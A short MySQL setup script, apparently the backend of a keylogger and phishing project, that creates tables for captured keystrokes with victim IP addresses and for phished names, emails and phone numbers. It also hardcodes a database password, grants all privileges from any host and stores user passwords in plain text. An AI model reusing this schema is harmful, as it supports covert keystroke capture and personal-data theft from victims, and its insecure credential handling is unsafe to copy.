	CREATE DATABASE IF NOT EXISTS bd_keyloggers;
	CREATE USER IF NOT EXISTS 'sea'@'%' IDENTIFIED BY 'proyectose@';
	GRANT ALL PRIVILEGES ON bd_keyloggers.* TO 'sea'@'%';
	FLUSH PRIVILEGES;

	USE bd_keyloggers;

	CREATE TABLE IF NOT EXISTS keylogger (
		id INT AUTO_INCREMENT PRIMARY KEY,
		fecha DATETIME NOT NULL,
		ip VARCHAR(100) NOT NULL,
		tecla VARCHAR(100) NOT NULL,
		tipo ENUM ('B','I','P','R') NOT NULL
	);

	CREATE TABLE IF NOT EXISTS phishing (
		id INT AUTO_INCREMENT PRIMARY KEY,
		fecha VARCHAR(100) NOT NULL,
		ip VARCHAR(100) NOT NULL,
		nombre_apellidos VARCHAR(100) NOT NULL,
		email VARCHAR(100) NOT NULL,
		telefono VARCHAR(100) NOT NULL
	);

	CREATE TABLE IF NOT EXISTS usuario (
		nombre VARCHAR (100) PRIMARY KEY,
		apellido VARCHAR (100) NOT NULL,
		contrasena VARCHAR(100) NOT NULL
	);


